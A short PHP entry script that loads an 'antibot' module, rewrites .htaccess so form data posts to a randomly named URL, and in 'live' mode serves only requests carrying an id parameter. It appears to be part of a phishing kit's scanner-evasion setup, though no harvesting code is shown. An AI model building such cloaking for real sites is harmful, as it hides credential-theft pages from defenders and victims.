<?php
session_start();

require_once __DIR__ . '/../config.php';
require_once __DIR__ . '/antibot.php';
if ($config['esc']) {
    require_once __DIR__ . '/esc/esc.php';
}
require_once __DIR__ . '/function.php';

// random url sent data
$keyforpost = random_string(50);
rewrite_htaccess($keyforpost);

if ($config['mode'] == 'live') {
    if (!isset($_GET['id'])) exit;
}

// set current link
$_SESSION['current_link'] = get_current_link();
